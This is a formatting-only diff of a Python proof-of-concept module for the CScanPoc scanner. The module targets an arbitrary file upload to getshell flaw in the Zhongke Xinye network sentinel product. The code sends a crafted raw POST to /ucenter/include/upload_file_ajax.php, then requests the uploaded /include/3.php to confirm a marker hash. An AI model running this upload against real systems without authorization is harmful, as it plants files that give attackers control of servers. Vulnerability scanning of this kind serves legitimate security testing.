@@ -3,11 +3,12 @@
 from CScanPoc.thirdparty import requests, hackhttp
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 
+
 class Vuln(ABVuln):
-    vuln_id = 'seentech_0001' # 平台漏洞编号，留空
+    vuln_id = 'seentech_0001'  # 平台漏洞编号，留空
     name = '中科新业网络哨兵任意文件上传getshell'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
-    type = VulnType.FILE_UPLOAD # 漏洞类型
+    type = VulnType.FILE_UPLOAD  # 漏洞类型
     disclosure_date = '2015-04-20'  # 漏洞公布时间
     desc = '''
         中科新业网络哨兵系统 /ucenter/include/upload_file_ajax.php 页面任意文件上传。
@@ -31,8 +32,8 @@ class Poc(ABPoc):
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
-            
-            #link：http://wooyun.org/bugs/wooyun-2010-0108640
+
+            # link：http://wooyun.org/bugs/wooyun-2010-0108640
             hh = hackhttp.hackhttp()
             raw = """
 POST /ucenter/include/upload_file_ajax.php HTTP/1.1
@@ -65,12 +66,12 @@ aaaa
 """
 
             url1 = self.target + '/include/upload_file_ajax.php'
-            code, head,res, errcode, _ = hh.http(url1, raw=raw)
+            code, head, res, errcode, _ = hh.http(url1, raw=raw)
             url2 = self.target + '/include/3.php'
-            code, head,res, errcode, _ = hh.http(url2)
+            code, head, res, errcode, _ = hh.http(url2)
 
             if code == 200 and 'e87ebbaed6f97f26e222e030eddbad1c' in res:
-                #security_hole(url1)
+                # security_hole(url1)
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                     target=self.target, name=self.vuln.name))
 
@@ -79,6 +80,7 @@ aaaa
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
